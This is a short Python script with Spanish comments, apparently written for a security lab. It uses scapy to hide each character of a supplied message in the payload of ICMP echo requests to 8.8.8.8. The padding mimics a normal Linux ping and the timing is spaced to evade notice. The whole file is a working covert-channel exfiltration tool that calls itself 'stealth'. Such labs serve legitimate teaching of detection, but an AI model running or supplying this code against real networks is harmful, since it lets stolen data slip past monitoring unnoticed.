import sys
import time
from scapy.all import IP, ICMP, send, Raw

if len(sys.argv) != 2:
    print("Uso: sudo python3 pingv4.py <texto_cifrado>")
    sys.exit(1)

mensaje = sys.argv[1]
ip_destino = "8.8.8.8" # Haremos ping a los DNS de Google, que siempre responden

print(f"Iniciando exfiltración stealth hacia {ip_destino}...")

for caracter in mensaje:
    # Un ping normal de Linux envía 48 bytes de data. 
    # Generalmente son 8 bytes de un timestamp de C, seguidos de los bytes del 0x10 al 0x37.
    # Esconderemos nuestro caracter al principio, y rellenaremos el resto para sumar 48 bytes.
    
    # Convertimos el caracter a bytes
    char_byte = caracter.encode('utf-8')
    
    # Creamos un relleno simulado (7 bytes de ceros simulando el resto del timestamp + secuencia típica)
    padding = b'\x00' * 7 + bytes(range(0x10, 0x38))
    
    # Unimos todo. Total = 1 byte (char) + 7 bytes + 40 bytes = 48 bytes de payload
    payload_stealth = char_byte + padding
    
    # Construimos el paquete de red: Capa 3 (IP) + Capa 4 (ICMP tipo 8 es 'echo-request') + Payload
    paquete = IP(dst=ip_destino)/ICMP(type=8)/Raw(load=payload_stealth)
    
    # Enviamos el paquete. verbose=0 es para ocultar los mensajes por defecto de scapy
    send(paquete, verbose=0)
    
    # El laboratorio pide este output exacto
    print("Sent 1 packets.")
    
    # Esperamos 1 segundo para emular el comportamiento de un ping normal
    time.sleep(1)

print("Exfiltración completada.")